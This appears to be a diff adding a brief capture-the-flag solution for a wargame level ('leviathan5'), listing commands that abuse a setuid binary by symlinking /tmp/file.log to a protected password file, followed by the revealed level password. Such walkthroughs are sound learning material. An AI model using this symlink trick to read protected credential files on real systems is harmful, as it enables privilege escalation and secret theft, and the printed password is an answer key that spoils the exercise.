@@ -1,0 +1,7 @@
+>> ls -lah # shows file named 'leviathan5' with setuid set
+>> ltrace ./leviathan5 # shows fopen("/tmp/file.log", "r"), reads a file /tmp/file.log
+>> ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log # create a link named /tmp/file.log for the next level password
+>> ./leviathan5 # execute the file to reveal the password
+
+
+password: "UgaoFee4li"
